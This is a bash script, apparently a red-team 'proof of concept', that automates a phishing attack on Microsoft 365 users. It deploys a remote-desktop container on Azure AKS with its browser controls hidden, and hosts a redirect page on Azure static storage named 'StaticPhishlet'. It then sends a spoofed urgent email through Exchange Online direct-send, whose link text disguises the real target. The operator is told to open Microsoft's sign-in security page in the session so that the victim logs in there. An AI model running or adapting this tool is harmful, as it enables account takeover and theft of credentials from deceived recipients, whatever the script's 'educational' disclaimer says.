#!/bin/bash
## Author Patrick Binder
## Version 1.1
## Date 2025-01-01
## Filename azaksmail.sh

############################################################
#                   Azure Web App Deployment Tool           #
############################################################


# Exit on error
set -e

############################################################
#                   Colorful Echo Function                 #
############################################################
display_message() {
    local message="$1"
    local color="$2"
    case $color in
        red)    echo -e "\033[91m${message}\033[0m" ;;
        green)  echo -e "\033[92m${message}\033[0m" ;;
        yellow) echo -e "\033[93m${message}\033[0m" ;;
        blue)   echo -e "\033[94m${message}\033[0m" ;;
        cyan)   echo -e "\033[96m${message}\033[0m" ;;
        magenta)echo -e "\033[95m${message}\033[0m" ;;
        *)      echo "$message" ;;
    esac
}
############################################################
#                   Azure Portal Failsafe                  #
############################################################
check_azure_cloud_shell() {
    local os_name
    local hostname
    local kernel_version

    # Extract relevant system details
    os_name=$(grep -E '^PRETTY_NAME=' /etc/os-release | cut -d= -f2 | tr -d '"')
    hostname=$(cat /etc/hostname)
    kernel_version=$(uname -a)

    # Check for known Azure Cloud Shell indicators
    if [[ "$os_name" == *"CBL-Mariner"* ]] && [[ "$hostname" == SandboxHost-* ]] && [[ "$kernel_version" == *"microsoft-standard"* ]]; then
        display_message "Script is running in Azure Cloud Shell. Proceeding..." "green"
    else
        display_message "This script is designed to run only in Azure Cloud Shell." "red"
        exit 1
    fi
}
############################################################
#                   Fancy Banner Introduction              #
############################################################
display_banner() {
    display_message "############################################################################" "cyan"
    display_message "#     ___ _____      ___    __ _______    _____ ____  ____  ____  ______   #" "magenta"
    display_message "#    /   /__  /     /   |  / //_/ ___/   / ___// __ \/ __ \/ __ \/ ____/   #" "magenta"
    display_message "#   / /| | / /     / /| | / ,<  \__ \    \__ \/ /_/ / / / / / / / /_       #" "magenta"
    display_message "#  / ___ |/ /__   / ___ |/ /| |___/ /   ___/ / ____/ /_/ / /_/ / __/       #" "magenta"
    display_message "# /_/  |_/____/  /_/  |_/_/ |_/____/   /____/_/    \____/\____/_/          #" "magenta"
    display_message "#                                                                          #" "magenta"
    display_message "#            Azure POC Mailing Tool - AZ AKS Spoof                         #" "magenta"
    display_message "#            Embedding RDP Environment in a website                        #" "magenta"
    display_message "############################################################################" "cyan"
}



############################################################
#                      Send Email Function                 #
############################################################
send_email() {
    local smtp_server="$1"
    local to="$2"
    local from="$3"
    local subject="$4"
    local body="$5"

    pwsh -Command "
    \$smtpServer = '$smtp_server';
    \$from = '$from';
    \$to = '$to';
    \$subject = '$subject';
    \$body = @'
$body
'@;
    \$fromName = \"${firstname} ${lastname}\";
    try {
        Send-MailMessage -SmtpServer \$smtpServer -To \$to -From \$from -Subject \$subject -BodyAsHtml -Body \$body -Encoding ([System.Text.Encoding]::UTF8);
        Write-Output \"Email sent to \$(\$to) with subject \$(\$subject) from \$(\$fromName)\" 
    } catch {
        Write-Output \"Error sending email to \$(\$to): \$(\$_.Exception.Message)\" 
        exit 1
    }
    " || {
        display_message "Failed to send email." "red"
        exit 1
    }
}

############################################################
#               Confirm Script Execution                   #
############################################################
confirm_execution() {
    echo "Warning: only execute this script from Azure Portal Cloud Shell. This use is for educational purpose only."
    display_message "" "cyan"
    display_message "You need a correct SMTP server which you can find out with: dig mx fallback.onmicrosoft.com" "yellow"
    display_message "" "cyan"
    display_message "-------------------------------------------------" "cyan"
    display_message "" "cyan"
    read -p "Do you want to proceed? (yes/no): " confirmation
    if [[ "$confirmation" != "yes" ]]; then
        display_message "Script execution aborted by user." "red"
        exit 1
    fi
    display_message "" "cyan"
    display_message "-------------------------------------------------" "cyan"
    display_message "" "cyan"
}

############################################################
#            Check & Delete Old Resource Groups            #
############################################################
check_and_delete_old_resource_groups() {
    local old_groups
    old_groups=$(az group list --query "[?starts_with(name, 'StaticPhishlet')].name" -o tsv)

    if [[ -n "$old_groups" ]]; then
        display_message "Found old resource groups:" "yellow"
        echo "$old_groups"
        read -p "Do you want to delete these resource groups? (yes/no): " delete_confirmation
        if [[ "$delete_confirmation" == "yes" ]]; then
            while read -r group; do
                display_message "Deleting resource group $group..." "red"
                # Suppress deletion output
                az group delete --name "$group" --yes --no-wait >/dev/null 2>&1
            done <<< "$old_groups"
            display_message "All selected resource groups are marked for deletion." "green"
        else
            display_message "Skipping deletion of old resource groups." "yellow"
        fi
    else
        display_message "No old resource groups found." "green"
    fi
}

############################################################
#                      Main Execution                      #
############################################################
main() {
 # Run Azure Cloud Shell Failsafe
    check_azure_cloud_shell

    # -------------------------------------------------------
    # 1) Parse user-supplied arguments for email parameters
    #    (SmtpServer, To, From, Subject).
    # -------------------------------------------------------
     smtp_server=""
    recipient=""
    mail_address=""
    subject=""
    firstname=""
    lastname=""

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -SmtpServer)
                smtp_server="$2"
                shift 2
                ;;
            -To)
                recipient="$2"
                shift 2
                ;;
            -From)
                mail_address="$2"
                shift 2
                ;;
            -Subject)
                subject="$2"
                shift 2
                ;;
            -Firstname)
                firstname="$2"
                shift 2
                ;;
            -Lastname)
                lastname="$2"
                shift 2
                ;;
            *)
                shift
                ;;
        esac
    done

    # Provide fallback if any argument is missing
    if [[ -z "$smtp_server" ]]; then
        smtp_server="fallbackprefix.mail.protection.outlook.com"
    fi
    if [[ -z "$recipient" ]]; then
        recipient="recipient@fallbackprefix.onmicrosoft.com"
    fi
    if [[ -z "$mail_address" ]]; then
        mail_address="sender@fallbackprefix.onmicrosoft.com"
    fi
    if [[ -z "$subject" ]]; then
        subject="Mail POC Test"
    fi
    if [[ -z "$firstname" ]]; then
        firstname="John"
    fi
    if [[ -z "$lastname" ]]; then
        lastname="Doe"
    fi

    # Show fancy banner
    display_banner

    # Example usage info
    display_message "Example usage: $0 -SmtpServer 'fallback.mail.protection.outlook.com' -To 'helpdesk@fallback.onmicrosoft.com' -From 'helpdesk@fallback.onmicrosoft.com' -Subject 'Test Email' -Firstname 'John' -Lastname 'Doe'" "cyan"
    # Prompt user
    confirm_execution

    # Generate an SSH key for later use if it doesn't exist
    local ssh_key_name="$HOME/.ssh/az_arc_spoof_id_rsa"
    if [[ ! -f "$ssh_key_name" ]]; then
        display_message "Generating new SSH key at $ssh_key_name..." "blue"
        ssh-keygen -f "$ssh_key_name" -N "" -q
    fi

    # Check Azure login
    if ! az account show &>/dev/null; then
        display_message "Please login to Azure using 'az login'." "red"
        exit 1
    fi

    # Check and delete old resource groups
    check_and_delete_old_resource_groups

    local resource_group="StaticPhishlet-RG-$RANDOM"
    local location="eastus"
    local aks_name="rdp-cluster-$RANDOM"
    local storage_account_name="staticweb$RANDOM"
    local index_file="./index.html"
    local public_ip=""
    local email_body=""
    local index_file="./index.html"
    local public_ip=""
    local email_body=""

    # Create Resource Group
    display_message "Creating Resource Group: $resource_group ..." "blue"
    az group create --name "$resource_group" --location "$location" >/dev/null 2>&1
    
    display_message "Resource Group created: $resource_group" "green"
    
    # Create AKS Cluster
    display_message "Creating AKS Cluster: $aks_name ..." "blue"
    az aks create \
      --resource-group "$resource_group" \
      --name "$aks_name" \
      --node-count 1 \
      --ssh-key-value "${ssh_key_name}.pub" \
      --generate-ssh-keys >/dev/null 2>&1 || {
        display_message "Error occurred during AKS creation." "yellow"
        sleep 50
    }
        

    az aks get-credentials --resource-group "$resource_group" --name "$aks_name" >/dev/null 2>&1 || {
        display_message "Failed to retrieve AKS credentials." "yellow"
    }
    
    display_message "AKS Cluster created: $aks_name" "green"

   # Deploy RDP Container
display_message "Deploying RDP Container..." "blue"
cat <<EOF > rdp-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: rdp
spec:
  replicas: 1
  selector:
    matchLabels:
      app: rdp
  template:
    metadata:
      labels:
        app: rdp
    spec:
      containers:
      - name: rdp
        image: soff/tiny-remote-desktop
        ports:
        - containerPort: 6901
---
apiVersion: v1
kind: Service
metadata:
  name: rdp-service
spec:
  selector:
    app: rdp
  ports:
    - protocol: TCP
      port: 6901
      targetPort: 6901
  type: LoadBalancer
EOF
kubectl apply -f rdp-deployment.yaml >/dev/null 2>&1
display_message "Waiting for AKS to assign public IP..." "yellow"


# Wait for public IP
while [[ -z "$public_ip" ]]; do
    public_ip=$(kubectl get service rdp-service -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)
    sleep 2.5
done
display_message "AKS Public IP assigned: $public_ip" "green"

# Wait for the RDP container to be ready
display_message "Waiting for RDP container to be ready..." "yellow"
container_ready=0
while [[ $container_ready -eq 0 ]]; do
    if kubectl get pods -l app=rdp -o jsonpath='{.items[0].status.containerStatuses[0].ready}' 2>/dev/null | grep -q "true"; then
        container_ready=1
    else
        display_message "RDP container not ready yet. Waiting for 30 seconds..." "yellow"
        sleep 30
    fi
done
display_message "RDP container is ready." "green"

sleep 30

# Modify the file in the container
display_message "Modifying /usr/share/novnc/index.html in the container..." "blue"
kubectl exec $(kubectl get pods -l app=rdp -o jsonpath='{.items[0].metadata.name}') -- bash -c "echo '<!DOCTYPE html><html lang=\"en\"><head><title>Remote Desktop</title><style>html, body {margin: 0; padding: 0; overflow: hidden; height: 100%; width: 100%;} canvas {display: block; width: 100%; height: 100%; background-color: black;} #noVNC_status_bar, #noVNC_buttons {opacity: 0; pointer-events: none;}</style><script type=\"module\">import RFB from \"./core/rfb.js\";document.addEventListener(\"DOMContentLoaded\", () => {const urlParams = new URLSearchParams(window.location.search);const host = urlParams.get(\"host\") || \"localhost\";const port = urlParams.get(\"port\") || \"6901\";const path = urlParams.get(\"path\") || \"websockify\";const rfb = new RFB(document.body, \`ws://${host}:${port}/${path}\`, { shared: true });rfb.scaleViewport = true;rfb.resizeSession = true;rfb.viewOnly = false;window.addEventListener(\"resize\", () => {rfb.scaleViewport = true;rfb.resizeSession = true;});});</script></head><body></body></html>' > /usr/share/novnc/index.html"
display_message "File /usr/share/novnc/index.html modified successfully." "green"


    # Wait for public IP
    while [[ -z "$public_ip" ]]; do
        public_ip=$(kubectl get service rdp-service -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)
        sleep 2.5
    done
    display_message "AKS Public IP assigned: $public_ip" "green"

    # Create Storage Account
    display_message "Creating Storage Account: $storage_account_name ..." "blue"
    az storage account create --name "$storage_account_name" \
                              --resource-group "$resource_group" \
                              --location "$location" \
                              --sku Standard_LRS \
                              >/dev/null 2>&1
    
    az storage blob service-properties update \
       --account-name "$storage_account_name" \
       --static-website \
       --index-document "index.html" >/dev/null 2>&1
    display_message "Storage Account created: $storage_account_name" "green"

    # -------------------------------------------------------
    # ALWAYS recreate index.html, using the newly found $public_ip
    # -------------------------------------------------------
    display_message "Creating index.html for redirect..." "blue"
    cat <<EOF > "$index_file"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirect</title>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            window.location.href = "http://$public_ip:6901/vnc.html?autoconnect=true&reconnect=true&resize=on&show_control_bar=false";
        });
    </script>
</head>
<body></body>
</html>
EOF

    # Upload index.html to static website container
    az storage blob upload \
       --account-name "$storage_account_name" \
       --container-name "\$web" \
       --name "index.html" \
       --file "$index_file" >/dev/null 2>&1

    # Retrieve the actual primary web endpoint from Azure
    local website_url
    website_url=$(az storage account show \
        --name "$storage_account_name" \
        --resource-group "$resource_group" \
        --query 'primaryEndpoints.web' \
        -o tsv)

    # Build HTML email body
    email_body="<!DOCTYPE html><html><body>"
    email_body+="<p>Hi ${firstname},</p>"
    email_body+="<p>Schau dir das bitte dringend bis heute Abend an!</p>"
    email_body+="<p><a href=\"${website_url}\">https://www.abtis.de/emergency</a></p>"
    email_body+="</body></html>"

    # Send Email
    display_message "Sending Email to $recipient ..." "blue"
    send_email "$smtp_server" "$recipient" "$mail_address" "$subject" "$email_body"
    display_message "Email sent successfully to $recipient." "green"

    display_message "" "cyan"
    display_message "############################################" "cyan"
    display_message "RDP is available at: http://${public_ip}:6901/vnc.html?autoconnect=true&reconnect=true&resize=on&show_control_bar=false" "magenta"
    display_message "Static site redirect link: ${website_url}" "magenta"
    display_message "now navigate to rdp open https://mysignins.microsoft.com/security-info then F11" "cyan"
    display_message "############################################" "cyan"
    display_message "" "cyan"

    # Ask user about next steps
    display_message "Please check your mailbox (including junk folder) for the test email." "yellow"
    read -p "Do you want to exit now (yes) or connect via SSH to the cluster node (no)? (yes/no): " next_step
    if [[ "$next_step" == "yes" ]]; then
        display_message "Exiting script as per user choice." "green"
        exit 0
    else
        display_message "Proceeding with SSH connection attempt." "blue"
        ssh-keyscan "$public_ip" >> ~/.ssh/known_hosts 2>/dev/null || true
        chmod 600 "$ssh_key_name"
        display_message "Attempting to connect to sshusername@$public_ip ..." "blue"
        ssh -i "$ssh_key_name" sshusername@"$public_ip"
    fi
}

main "$@"
